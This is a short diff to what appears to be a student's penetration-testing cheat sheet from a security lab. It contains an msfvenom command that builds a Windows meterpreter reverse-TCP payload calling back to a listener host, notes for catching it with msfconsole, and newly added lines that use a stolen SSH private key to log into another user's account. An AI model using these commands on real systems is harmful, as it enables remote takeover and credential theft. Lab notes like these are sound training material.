@@ -141,4 +141,9 @@ Get-Content -First 2 .\demo1_new.exe
 ###WIN PAYLOAD 
 msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.40.70 lport=21250 -b "\x00" -f python
 ## msfconsole use multi/handler set payload windows/meterpreter/reversetcp set lhost, lport 
-##
+---------------------------------------------------------------
+###STEAL PRIV KEY
+chmod 600 /home/student/stolenkey
+ssh -i /home/student/stolenkey jane@1.2.3.4
+###
+#check tarballs
